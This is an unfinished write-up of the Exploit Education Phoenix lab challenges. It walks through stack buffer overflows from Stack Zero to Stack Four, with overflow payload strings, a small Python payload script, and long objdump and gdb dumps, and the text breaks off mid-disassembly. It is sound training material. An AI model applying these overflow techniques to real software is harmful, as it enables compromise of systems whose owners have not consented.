 #WORK IN PROGRESS
 ## Table of Contents
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [Challenge 1 - Stack Zero](#challenge-1---stack-zero)
- [Challenge 2 - Stack One](#challenge-2---stack-one)
- [Challenge 3 - Stack Two](#challenge-3---stack-two)
- [Challenge 4 - Stack Three](#challenge-4---stack-three)
- [Challenge 5 - Stack Four](#challenge-5---stack-four)
- [Challenge 6 - Stack Five](#challenge-6---stack-five)
- [Challenge 7 - Stack Six](#challenge-7---stack-six)
- [Challenge 8 - Format Zero](#challenge-8---format-zero)
- [Challenge 9 - Format One](#challenge-9---format-one)
- [Challenge 10 - Format Two](#challenge-10---format-two)
- [Challenge 11 - Format Three](#challenge-11---format-three)
- [Challenge 12 - Format Four](#challenge-12---format-four)
- [Challenge 13 - Heap Zero](#challenge-13---heap-zero)
- [Challenge 14 - Heap One](#challenge-14---heap-one)
- [Challenge 15 - Heap Two](#challenge-15---heap-two)
- [Challenge 16 - Heap Three](#challenge-16---heap-three)
- [Challenge 17 - Net Zero](#challenge-17---net-zero)
- [Challenge 18 - Net One](#challenge-18---net-one)
- [Challenge 19 - Net Two](#challenge-19---net-two)
- [Challenge 20 - Final Zero](#challenge-20---final-zero)
- [Challenge 21 - Final One](#challenge-21---final-one)
- [Challenge 22 - Final Two](#challenge-22---final-two)
## Introduction

Welcome to my exploit write up on the Pheonix challanges from the website [Exploit Education](https://exploit.education). 

## Challenge 1 - Stack Zero

[Stack Zero Code](https://exploit.education/phoenix/stack-zero/). 

The challenges start easy. All the code does is check if the volatile integer named changeme has been changed after getting user input. It puts the user input into a buffer with a size of 64 bytes. Since the buffer is only 64 bytes and the code does not check to see if the user input is greater than that, all that is needed to exploit the program is to give it an input greater than 64 bytes.

### Solved
```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed!
```

## Challenge 2 - Stack One

[Stack One Code](https://exploit.education/phoenix/stack-one/). 

This challenge is just as easy as the last. Instead of taking in a user input, the program takes a command-line argument then calls strcpy to copy it into the buffer variable. As an added challenge, the volatile integer now must be changed to a specific value in bytes. Like the last challenge, the buffer is a size 64 bytes meaning it can be overflowed if given a command argument this is a size greater than 64 bytes. If you give the program over 64 'A's it will tell you that the change me variable is not the correct value and what the given value is. The value of changeme is 4 A's in hexcode form.

```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x41414141, we want 0x496c5962
```
Since we now know what the program wants the changeme variable to be. We just need to add that to the end of 64 bytes of A. We need to translate the hex code into ascii to know what to added to the end of the A's. Looking at a hex to ascii chart gets us 49 = I, 6c = l, 59 = Y, and 62 = b.

```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIlYb
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x62596c49, we want 0x496c5962
```
If you put the new characters at the end of the argument string you will see that the challenge is still not complete. The reason for this is because of endianness the system uses little-endian design which flips in the argument that changes the changeme variable. If you account for endianness then the challenge is solved.

### Solved
```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```
### OR

A second simpler way to solve the challenge is to create a python script that prints out the bytes we need instead of going through the trouble of translating them to ascii. Still need to follow endianness.

```python
import sys
fill = b'A' * 64
adr = b'\x62\x59\x6c\x49'
sys.stdout.buffer.write(fill+adr)
```

```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero $(python3 stack-one.py)
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Challenge 3 - Stack Two

[Stack Two Code](https://exploit.education/phoenix/stack-two/). 

For this challenge like the last one, it doesn't use user input. Instead of using a command-line argument too, the program uses an environment variable called, ExploitEducation. It sets a char pointer to where ever the environment variable is set. Then whatever is in the ExploitEducation variable is copied into the variable. buffer, which is a char array with the size of 64 bits. Like the last challenge, the volatile integer must be changed to a specific value in bytes. Since the buffer is a size of 64 bytes like the other challenges, it can be overflowed if given an environment variable that contains a string greater than 64 bytes. To set the environment variable you just put in the command line ExploitEducation = “xxxx” then the program. Like:

```bash
user@phoenix-amd64:~$ ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA /opt/phoenix/amd64/stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x41414141, we want 0x0d0a090a
```

If you set the variable over 64 'A's it will tell you that the change me variable is not the correct value and what the given value should be. Unlike the last challenge, the hex code can not be converted to ascii. To set the variable to the right hex code all you need to do is add “\x{hexcode}”. Since the program wants 0x0d0a09 you just need to add \x0a\x09\x0a\x0d, which accounts for endianness, to the end of 64 other characters. That is it, the challenge is solved.

### Solved
```bash
user@phoenix-amd64:~$ ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0a\x09\x0a\x0d /opt/phoenix/amd64/stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Challenge 4 - Stack Three

[Stack Three Code](https://exploit.education/phoenix/stack-three/). 

This program like the first gets user input and places it into a buffer variable with a size of 64 bytes. What is different for this program is the volatile integer is a function pointer. So when you overwrite the fp variable then call the function it contains. It will call whatever function with the hex you overwrote the variable with. Which can be any function you want in the program. If you use the objdump program it can tell you all the hexcode for every function in the program. The function we want to call is complete_level.

```bash
user@phoenix-amd64:~$ objdump -d /opt/phoenix/amd64/stack-three 

/opt/phoenix/amd64/stack-three:     file format elf64-x86-64


Disassembly of section .init:

00000000004004b0 <_init>:
  4004b0:       50                      push   %rax
  4004b1:       e8 ba 01 00 00          callq  400670 <frame_dummy>
  4004b6:       e8 85 02 00 00          callq  400740 <__do_global_ctors_aux>
  4004bb:       58                      pop    %rax
  4004bc:       c3                      retq   

Disassembly of section .plt:

00000000004004c0 <.plt>:
  4004c0:       ff 35 0a 06 20 00       pushq  0x20060a(%rip)        # 600ad0 <_GLOBAL_OFFSET_TABLE_+0x8>
  4004c6:       ff 25 0c 06 20 00       jmpq   *0x20060c(%rip)        # 600ad8 <_GLOBAL_OFFSET_TABLE_+0x10>
  4004cc:       0f 1f 40 00             nopl   0x0(%rax)

00000000004004d0 <printf@plt>:
  4004d0:       ff 25 0a 06 20 00       jmpq   *0x20060a(%rip)        # 600ae0 <printf>
  4004d6:       68 00 00 00 00          pushq  $0x0
  4004db:       e9 e0 ff ff ff          jmpq   4004c0 <.plt>

00000000004004e0 <gets@plt>:
  4004e0:       ff 25 02 06 20 00       jmpq   *0x200602(%rip)        # 600ae8 <gets>
  4004e6:       68 01 00 00 00          pushq  $0x1
  4004eb:       e9 d0 ff ff ff          jmpq   4004c0 <.plt>

00000000004004f0 <puts@plt>:
  4004f0:       ff 25 fa 05 20 00       jmpq   *0x2005fa(%rip)        # 600af0 <puts>
  4004f6:       68 02 00 00 00          pushq  $0x2
  4004fb:       e9 c0 ff ff ff          jmpq   4004c0 <.plt>

0000000000400500 <fflush@plt>:
  400500:       ff 25 f2 05 20 00       jmpq   *0x2005f2(%rip)        # 600af8 <fflush>
  400506:       68 03 00 00 00          pushq  $0x3
  40050b:       e9 b0 ff ff ff          jmpq   4004c0 <.plt>

0000000000400510 <exit@plt>:
  400510:       ff 25 ea 05 20 00       jmpq   *0x2005ea(%rip)        # 600b00 <exit>
  400516:       68 04 00 00 00          pushq  $0x4
  40051b:       e9 a0 ff ff ff          jmpq   4004c0 <.plt>

0000000000400520 <__libc_start_main@plt>:
  400520:       ff 25 e2 05 20 00       jmpq   *0x2005e2(%rip)        # 600b08 <__libc_start_main>
  400526:       68 05 00 00 00          pushq  $0x5
  40052b:       e9 90 ff ff ff          jmpq   4004c0 <.plt>

Disassembly of section .text:

0000000000400530 <_start>:
  400530:       48 31 ed                xor    %rbp,%rbp
  400533:       48 89 e7                mov    %rsp,%rdi
  400536:       48 8d 35 1b 04 20 00    lea    0x20041b(%rip),%rsi        # 600958 <_DYNAMIC>
  40053d:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
  400541:       e8 00 00 00 00          callq  400546 <_start_c>

0000000000400546 <_start_c>:
  400546:       48 83 ec 08             sub    $0x8,%rsp
  40054a:       48 8b 37                mov    (%rdi),%rsi
  40054d:       48 8d 57 08             lea    0x8(%rdi),%rdx
  400551:       45 31 c9                xor    %r9d,%r9d
  400554:       41 b8 82 07 40 00       mov    $0x400782,%r8d
  40055a:       b9 b0 04 40 00          mov    $0x4004b0,%ecx
  40055f:       bf b5 06 40 00          mov    $0x4006b5,%edi
  400564:       e8 b7 ff ff ff          callq  400520 <__libc_start_main@plt>
  400569:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)

0000000000400570 <deregister_tm_clones>:
  400570:       55                      push   %rbp
  400571:       b8 18 0b 60 00          mov    $0x600b18,%eax
  400576:       48 3d 18 0b 60 00       cmp    $0x600b18,%rax
  40057c:       48 89 e5                mov    %rsp,%rbp
  40057f:       74 17                   je     400598 <deregister_tm_clones+0x28>
  400581:       b8 00 00 00 00          mov    $0x0,%eax
  400586:       48 85 c0                test   %rax,%rax
  400589:       74 0d                   je     400598 <deregister_tm_clones+0x28>
  40058b:       5d                      pop    %rbp
  40058c:       bf 18 0b 60 00          mov    $0x600b18,%edi
  400591:       ff e0                   jmpq   *%rax
  400593:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400598:       5d                      pop    %rbp
  400599:       c3                      retq   
  40059a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

00000000004005a0 <register_tm_clones>:
  4005a0:       be 18 0b 60 00          mov    $0x600b18,%esi
  4005a5:       55                      push   %rbp
  4005a6:       48 81 ee 18 0b 60 00    sub    $0x600b18,%rsi
  4005ad:       48 89 e5                mov    %rsp,%rbp
  4005b0:       48 c1 fe 03             sar    $0x3,%rsi
  4005b4:       48 89 f0                mov    %rsi,%rax
  4005b7:       48 c1 e8 3f             shr    $0x3f,%rax
  4005bb:       48 01 c6                add    %rax,%rsi
  4005be:       48 d1 fe                sar    %rsi
  4005c1:       74 15                   je     4005d8 <register_tm_clones+0x38>
  4005c3:       b8 00 00 00 00          mov    $0x0,%eax
  4005c8:       48 85 c0                test   %rax,%rax
  4005cb:       74 0b                   je     4005d8 <register_tm_clones+0x38>
  4005cd:       5d                      pop    %rbp
  4005ce:       bf 18 0b 60 00          mov    $0x600b18,%edi
  4005d3:       ff e0                   jmpq   *%rax
  4005d5:       0f 1f 00                nopl   (%rax)
  4005d8:       5d                      pop    %rbp
  4005d9:       c3                      retq   
  4005da:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

00000000004005e0 <__do_global_dtors_aux>:
  4005e0:       80 3d 59 05 20 00 00    cmpb   $0x0,0x200559(%rip)        # 600b40 <completed.5577>
  4005e7:       75 77                   jne    400660 <__do_global_dtors_aux+0x80>
  4005e9:       55                      push   %rbp
  4005ea:       48 8b 05 57 05 20 00    mov    0x200557(%rip),%rax        # 600b48 <dtor_idx.5579>
  4005f1:       48 89 e5                mov    %rsp,%rbp
  4005f4:       41 54                   push   %r12
  4005f6:       53                      push   %rbx
  4005f7:       bb 50 09 60 00          mov    $0x600950,%ebx
  4005fc:       41 bc 48 09 60 00       mov    $0x600948,%r12d
  400602:       48 81 eb 48 09 60 00    sub    $0x600948,%rbx
  400609:       48 c1 fb 03             sar    $0x3,%rbx
  40060d:       48 83 eb 01             sub    $0x1,%rbx
  400611:       48 39 d8                cmp    %rbx,%rax
  400614:       73 25                   jae    40063b <__do_global_dtors_aux+0x5b>
  400616:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40061d:       00 00 00 
  400620:       48 83 c0 01             add    $0x1,%rax
  400624:       48 89 05 1d 05 20 00    mov    %rax,0x20051d(%rip)        # 600b48 <dtor_idx.5579>
  40062b:       41 ff 14 c4             callq  *(%r12,%rax,8)
  40062f:       48 8b 05 12 05 20 00    mov    0x200512(%rip),%rax        # 600b48 <dtor_idx.5579>
  400636:       48 39 d8                cmp    %rbx,%rax
  400639:       72 e5                   jb     400620 <__do_global_dtors_aux+0x40>
  40063b:       e8 30 ff ff ff          callq  400570 <deregister_tm_clones>
  400640:       b8 00 00 00 00          mov    $0x0,%eax
  400645:       48 85 c0                test   %rax,%rax
  400648:       74 0a                   je     400654 <__do_global_dtors_aux+0x74>
  40064a:       bf f0 08 40 00          mov    $0x4008f0,%edi
  40064f:       e8 ac f9 bf ff          callq  0 <_init-0x4004b0>
  400654:       5b                      pop    %rbx
  400655:       c6 05 e4 04 20 00 01    movb   $0x1,0x2004e4(%rip)        # 600b40 <completed.5577>
  40065c:       41 5c                   pop    %r12
  40065e:       5d                      pop    %rbp
  40065f:       c3                      retq   
  400660:       f3 c3                   repz retq 
  400662:       0f 1f 40 00             nopl   0x0(%rax)
  400666:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40066d:       00 00 00 

0000000000400670 <frame_dummy>:
  400670:       b8 00 00 00 00          mov    $0x0,%eax
  400675:       48 85 c0                test   %rax,%rax
  400678:       74 1e                   je     400698 <frame_dummy+0x28>
  40067a:       55                      push   %rbp
  40067b:       be 60 0b 60 00          mov    $0x600b60,%esi
  400680:       bf f0 08 40 00          mov    $0x4008f0,%edi
  400685:       48 89 e5                mov    %rsp,%rbp
  400688:       e8 73 f9 bf ff          callq  0 <_init-0x4004b0>
  40068d:       5d                      pop    %rbp
  40068e:       e9 0d ff ff ff          jmpq   4005a0 <register_tm_clones>
  400693:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400698:       e9 03 ff ff ff          jmpq   4005a0 <register_tm_clones>

000000000040069d <complete_level>:
  40069d:       55                      push   %rbp
  40069e:       48 89 e5                mov    %rsp,%rbp
  4006a1:       bf 90 07 40 00          mov    $0x400790,%edi
  4006a6:       e8 45 fe ff ff          callq  4004f0 <puts@plt>
  4006ab:       bf 00 00 00 00          mov    $0x0,%edi
  4006b0:       e8 5b fe ff ff          callq  400510 <exit@plt>

00000000004006b5 <main>:
  4006b5:       55                      push   %rbp
  4006b6:       48 89 e5                mov    %rsp,%rbp
  4006b9:       48 83 ec 60             sub    $0x60,%rsp
  4006bd:       89 7d ac                mov    %edi,-0x54(%rbp)
  4006c0:       48 89 75 a0             mov    %rsi,-0x60(%rbp)
  4006c4:       bf d8 07 40 00          mov    $0x4007d8,%edi
  4006c9:       e8 22 fe ff ff          callq  4004f0 <puts@plt>
  4006ce:       48 c7 45 f0 00 00 00    movq   $0x0,-0x10(%rbp)
  4006d5:       00 
  4006d6:       48 8d 45 b0             lea    -0x50(%rbp),%rax
  4006da:       48 89 c7                mov    %rax,%rdi
  4006dd:       e8 fe fd ff ff          callq  4004e0 <gets@plt>
  4006e2:       48 8b 45 f0             mov    -0x10(%rbp),%rax
  4006e6:       48 85 c0                test   %rax,%rax
  4006e9:       74 32                   je     40071d <main+0x68>
  4006eb:       48 8b 45 f0             mov    -0x10(%rbp),%rax
  4006ef:       48 89 c6                mov    %rax,%rsi
  4006f2:       bf 28 08 40 00          mov    $0x400828,%edi
  4006f7:       b8 00 00 00 00          mov    $0x0,%eax
  4006fc:       e8 cf fd ff ff          callq  4004d0 <printf@plt>
  400701:       48 8b 05 18 04 20 00    mov    0x200418(%rip),%rax        # 600b20 <stdout>
  400708:       48 89 c7                mov    %rax,%rdi
  40070b:       e8 f0 fd ff ff          callq  400500 <fflush@plt>
  400710:       48 8b 55 f0             mov    -0x10(%rbp),%rdx
  400714:       b8 00 00 00 00          mov    $0x0,%eax
  400719:       ff d2                   callq  *%rdx
  40071b:       eb 0a                   jmp    400727 <main+0x72>
  40071d:       bf 48 08 40 00          mov    $0x400848,%edi
  400722:       e8 c9 fd ff ff          callq  4004f0 <puts@plt>
  400727:       bf 00 00 00 00          mov    $0x0,%edi
  40072c:       e8 df fd ff ff          callq  400510 <exit@plt>
  400731:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  400738:       00 00 00 
  40073b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000400740 <__do_global_ctors_aux>:
  400740:       48 8b 05 f1 01 20 00    mov    0x2001f1(%rip),%rax        # 600938 <__CTOR_LIST__>
  400747:       48 83 f8 ff             cmp    $0xffffffffffffffff,%rax
  40074b:       74 33                   je     400780 <__do_global_ctors_aux+0x40>
  40074d:       55                      push   %rbp
  40074e:       48 89 e5                mov    %rsp,%rbp
  400751:       53                      push   %rbx
  400752:       bb 38 09 60 00          mov    $0x600938,%ebx
  400757:       48 83 ec 08             sub    $0x8,%rsp
  40075b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400760:       48 83 eb 08             sub    $0x8,%rbx
  400764:       ff d0                   callq  *%rax
  400766:       48 8b 03                mov    (%rbx),%rax
  400769:       48 83 f8 ff             cmp    $0xffffffffffffffff,%rax
  40076d:       75 f1                   jne    400760 <__do_global_ctors_aux+0x20>
  40076f:       48 83 c4 08             add    $0x8,%rsp
  400773:       5b                      pop    %rbx
  400774:       5d                      pop    %rbp
  400775:       c3                      retq   
  400776:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40077d:       00 00 00 
  400780:       f3 c3                   repz retq 

Disassembly of section .fini:

0000000000400782 <_fini>:
  400782:       50                      push   %rax
  400783:       e8 58 fe ff ff          callq  4005e0 <__do_global_dtors_aux>
  400788:       58                      pop    %rax
  400789:       c3                      retq   
```
 
 As you can see when using objdump you get the hex 0x40069d for the location of the complete_level function. The best way of inputing the user input for the program is to pipe it in using python. Calling python with the -c flag makes it run whatever code is in "". So you can print a string then pipe to the program with the | command. To solve the program all you need to do is append the hex code \x9d\x06\x40, accounting for endianness, at the end of 64 charaters of junk. 
 
```bash
 user@phoenix-amd64:~$ python -c "print('A' * 64 + '\x9d\x06\x40')" | /opt/phoenix/amd64/stack-three  
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```
 

## Challenge 5 - Stack Four

[Stack Four Code](https://exploit.education/phoenix/stack-four/). 
 
This challange is the exact same as the last challenge. Expect instead of overwritting a function pointer we have to overwrite a return function. The concept is the same it just requires a little more work. To figure this challenge out we will need to debug the program using gdb. Using gdb we will disassemble the function start_level and place a breakpoint at ret. Then we will run the program and input a string containing the alphabet.

```bash
(gdb) disas start_level
Dump of assembler code for function start_level:
   0x0000000000400635 <+0>:     push   rbp
   0x0000000000400636 <+1>:     mov    rbp,rsp
   0x0000000000400639 <+4>:     sub    rsp,0x50
   0x000000000040063d <+8>:     lea    rax,[rbp-0x50]
   0x0000000000400641 <+12>:    mov    rdi,rax
   0x0000000000400644 <+15>:    call   0x400470 <gets@plt>
   0x0000000000400649 <+20>:    mov    rax,QWORD PTR [rbp+0x8]
   0x000000000040064d <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400651 <+28>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400655 <+32>:    mov    rsi,rax
   0x0000000000400658 <+35>:    mov    edi,0x400733
   0x000000000040065d <+40>:    mov    eax,0x0
   0x0000000000400662 <+45>:    call   0x400460 <printf@plt>
   0x0000000000400667 <+50>:    nop
   0x0000000000400668 <+51>:    leave  
   0x0000000000400669 <+52>:    ret    
End of assembler dump.
(gdb) break *0x4006679
Breakpoint 1 at 0x400669
(gdb) r 
Starting program: /opt/phoenix/amd64/stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
AAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
(gdb) x/s $rip
0x400669 <start_level+52>:      "\303UH\211\345H\203\354\020\211}\374H\211u\360\277P\a@"
Python Exception <class 'UnicodeEncodeError'> 'ascii' codec can't encode character '\u27a4' in position 12: ordinal not in range(128): 
(gdb) si
0x5858585757575756 in ?? ()
(gdb) x/s $rip
0x5858585757575756:     <error: Cannot access memory at address 0x5858585757575756>
 ```
 
 If we check the instruction pointer at the breakpoint it will point to the return function location still. If we then take one step and check the program pounter again it will be pointing to XXXWWWWV. So we can see that we have overwrite the loction the return function was pointing too. We also know where on the string it is being overwritten. The next thing we need to do is get the function's hexcode we want to jump to and place it on the string.  
 
```bash
 user@phoenix-amd64:~$ objdump -d /opt/phoenix/amd64/stack-four  

/opt/phoenix/amd64/stack-four:     file format elf64-x86-64


Disassembly of section .init:

0000000000400438 <_init>:
  400438:       50                      push   %rax
  400439:       e8 b2 01 00 00          callq  4005f0 <frame_dummy>
  40043e:       e8 5d 02 00 00          callq  4006a0 <__do_global_ctors_aux>
  400443:       58                      pop    %rax
  400444:       c3                      retq   

Disassembly of section .plt:

0000000000400450 <.plt>:
  400450:       ff 35 82 05 20 00       pushq  0x200582(%rip)        # 6009d8 <_GLOBAL_OFFSET_TABLE_+0x8>
  400456:       ff 25 84 05 20 00       jmpq   *0x200584(%rip)        # 6009e0 <_GLOBAL_OFFSET_TABLE_+0x10>
  40045c:       0f 1f 40 00             nopl   0x0(%rax)

0000000000400460 <printf@plt>:
  400460:       ff 25 82 05 20 00       jmpq   *0x200582(%rip)        # 6009e8 <printf>
  400466:       68 00 00 00 00          pushq  $0x0
  40046b:       e9 e0 ff ff ff          jmpq   400450 <.plt>

0000000000400470 <gets@plt>:
  400470:       ff 25 7a 05 20 00       jmpq   *0x20057a(%rip)        # 6009f0 <gets>
  400476:       68 01 00 00 00          pushq  $0x1
  40047b:       e9 d0 ff ff ff          jmpq   400450 <.plt>

0000000000400480 <puts@plt>:
  400480:       ff 25 72 05 20 00       jmpq   *0x200572(%rip)        # 6009f8 <puts>
  400486:       68 02 00 00 00          pushq  $0x2
  40048b:       e9 c0 ff ff ff          jmpq   400450 <.plt>

0000000000400490 <exit@plt>:
  400490:       ff 25 6a 05 20 00       jmpq   *0x20056a(%rip)        # 600a00 <exit>
  400496:       68 03 00 00 00          pushq  $0x3
  40049b:       e9 b0 ff ff ff          jmpq   400450 <.plt>

00000000004004a0 <__libc_start_main@plt>:
  4004a0:       ff 25 62 05 20 00       jmpq   *0x200562(%rip)        # 600a08 <__libc_start_main>
  4004a6:       68 04 00 00 00          pushq  $0x4
  4004ab:       e9 a0 ff ff ff          jmpq   400450 <.plt>

Disassembly of section .text:

00000000004004b0 <_start>:
  4004b0:       48 31 ed                xor    %rbp,%rbp
  4004b3:       48 89 e7                mov    %rsp,%rdi
  4004b6:       48 8d 35 d3 03 20 00    lea    0x2003d3(%rip),%rsi        # 600890 <_DYNAMIC>
  4004bd:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
  4004c1:       e8 00 00 00 00          callq  4004c6 <_start_c>

00000000004004c6 <_start_c>:
  4004c6:       48 83 ec 08             sub    $0x8,%rsp
  4004ca:       48 8b 37                mov    (%rdi),%rsi
  4004cd:       48 8d 57 08             lea    0x8(%rdi),%rdx
  4004d1:       45 31 c9                xor    %r9d,%r9d
  4004d4:       41 b8 e2 06 40 00       mov    $0x4006e2,%r8d
  4004da:       b9 38 04 40 00          mov    $0x400438,%ecx
  4004df:       bf 6a 06 40 00          mov    $0x40066a,%edi
  4004e4:       e8 b7 ff ff ff          callq  4004a0 <__libc_start_main@plt>
  4004e9:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)

00000000004004f0 <deregister_tm_clones>:
  4004f0:       55                      push   %rbp
  4004f1:       b8 18 0a 60 00          mov    $0x600a18,%eax
  4004f6:       48 3d 18 0a 60 00       cmp    $0x600a18,%rax
  4004fc:       48 89 e5                mov    %rsp,%rbp
  4004ff:       74 17                   je     400518 <deregister_tm_clones+0x28>
  400501:       b8 00 00 00 00          mov    $0x0,%eax
  400506:       48 85 c0                test   %rax,%rax
  400509:       74 0d                   je     400518 <deregister_tm_clones+0x28>
  40050b:       5d                      pop    %rbp
  40050c:       bf 18 0a 60 00          mov    $0x600a18,%edi
  400511:       ff e0                   jmpq   *%rax
  400513:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400518:       5d                      pop    %rbp
  400519:       c3                      retq   
  40051a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

0000000000400520 <register_tm_clones>:
  400520:       be 18 0a 60 00          mov    $0x600a18,%esi
  400525:       55                      push   %rbp
  400526:       48 81 ee 18 0a 60 00    sub    $0x600a18,%rsi
  40052d:       48 89 e5                mov    %rsp,%rbp
  400530:       48 c1 fe 03             sar    $0x3,%rsi
  400534:       48 89 f0                mov    %rsi,%rax
  400537:       48 c1 e8 3f             shr    $0x3f,%rax
  40053b:       48 01 c6                add    %rax,%rsi
  40053e:       48 d1 fe                sar    %rsi
  400541:       74 15                   je     400558 <register_tm_clones+0x38>
  400543:       b8 00 00 00 00          mov    $0x0,%eax
  400548:       48 85 c0                test   %rax,%rax
  40054b:       74 0b                   je     400558 <register_tm_clones+0x38>
  40054d:       5d                      pop    %rbp
  40054e:       bf 18 0a 60 00          mov    $0x600a18,%edi
  400553:       ff e0                   jmpq   *%rax
  400555:       0f 1f 00                nopl   (%rax)
  400558:       5d                      pop    %rbp
  400559:       c3                      retq   
  40055a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

0000000000400560 <__do_global_dtors_aux>:
  400560:       80 3d b9 04 20 00 00    cmpb   $0x0,0x2004b9(%rip)        # 600a20 <completed.5577>
  400567:       75 77                   jne    4005e0 <__do_global_dtors_aux+0x80>
  400569:       55                      push   %rbp
  40056a:       48 8b 05 b7 04 20 00    mov    0x2004b7(%rip),%rax        # 600a28 <dtor_idx.5579>
  400571:       48 89 e5                mov    %rsp,%rbp
  400574:       41 54                   push   %r12
  400576:       53                      push   %rbx
  400577:       bb 88 08 60 00          mov    $0x600888,%ebx
  40057c:       41 bc 80 08 60 00       mov    $0x600880,%r12d
  400582:       48 81 eb 80 08 60 00    sub    $0x600880,%rbx
  400589:       48 c1 fb 03             sar    $0x3,%rbx
  40058d:       48 83 eb 01             sub    $0x1,%rbx
  400591:       48 39 d8                cmp    %rbx,%rax
  400594:       73 25                   jae    4005bb <__do_global_dtors_aux+0x5b>
  400596:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40059d:       00 00 00 
  4005a0:       48 83 c0 01             add    $0x1,%rax
  4005a4:       48 89 05 7d 04 20 00    mov    %rax,0x20047d(%rip)        # 600a28 <dtor_idx.5579>
  4005ab:       41 ff 14 c4             callq  *(%r12,%rax,8)
  4005af:       48 8b 05 72 04 20 00    mov    0x200472(%rip),%rax        # 600a28 <dtor_idx.5579>
  4005b6:       48 39 d8                cmp    %rbx,%rax
  4005b9:       72 e5                   jb     4005a0 <__do_global_dtors_aux+0x40>
  4005bb:       e8 30 ff ff ff          callq  4004f0 <deregister_tm_clones>
  4005c0:       b8 00 00 00 00          mov    $0x0,%eax
  4005c5:       48 85 c0                test   %rax,%rax
  4005c8:       74 0a                   je     4005d4 <__do_global_dtors_aux+0x74>
  4005ca:       bf 08 08 40 00          mov    $0x400808,%edi
  4005cf:       e8 2c fa bf ff          callq  0 <_init-0x400438>
  4005d4:       5b                      pop    %rbx
  4005d5:       c6 05 44 04 20 00 01    movb   $0x1,0x200444(%rip)        # 600a20 <completed.5577>
  4005dc:       41 5c                   pop    %r12
  4005de:       5d                      pop    %rbp
  4005df:       c3                      retq   
  4005e0:       f3 c3                   repz retq 
  4005e2:       0f 1f 40 00             nopl   0x0(%rax)
  4005e6:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  4005ed:       00 00 00 

00000000004005f0 <frame_dummy>:
  4005f0:       b8 00 00 00 00          mov    $0x0,%eax
  4005f5:       48 85 c0                test   %rax,%rax
  4005f8:       74 1e                   je     400618 <frame_dummy+0x28>
  4005fa:       55                      push   %rbp
  4005fb:       be 40 0a 60 00          mov    $0x600a40,%esi
  400600:       bf 08 08 40 00          mov    $0x400808,%edi
  400605:       48 89 e5                mov    %rsp,%rbp
  400608:       e8 f3 f9 bf ff          callq  0 <_init-0x400438>
  40060d:       5d                      pop    %rbp
  40060e:       e9 0d ff ff ff          jmpq   400520 <register_tm_clones>
  400613:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400618:       e9 03 ff ff ff          jmpq   400520 <register_tm_clones>

000000000040061d <complete_level>:
  40061d:       55                      push   %rbp
  40061e:       48 89 e5                mov    %rsp,%rbp
  400621:       bf f0 06 40 00          mov    $0x4006f0,%edi
  400626:       e8 55 fe ff ff          callq  400480 <puts@plt>
  40062b:       bf 00 00 00 00          mov    $0x0,%edi
  400630:       e8 5b fe ff ff          callq  400490 <exit@plt>

0000000000400635 <start_level>:
  400635:       55                      push   %rbp
  400636:       48 89 e5                mov    %rsp,%rbp
